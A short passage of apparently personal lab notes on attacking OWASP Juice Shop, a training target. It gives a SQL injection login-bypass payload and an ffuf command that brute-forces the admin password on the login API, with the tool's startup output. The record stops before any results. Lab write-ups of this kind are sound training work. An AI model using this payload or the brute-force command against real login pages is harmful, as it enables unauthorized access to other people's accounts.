you[[Writeup]]
![[Pasted image 20250508173603.png]]

SQL INJECTION
![[Pasted image 20250508180050.png]]
simple payload `admin@email.com' --


brute force
```
┌──(dd0x㉿kali)-[~]
└─$ ffuf -X POST -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
    -u http://10.10.14.204/rest/user/login \
    -w ~/Downloads/common.txt \
    -mc 200


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.14.204/rest/user/login
 :: Wordlist         : FUZZ: /home/kali/Downloads/common.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"email":"admin@juice-sh.op","password":"FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
```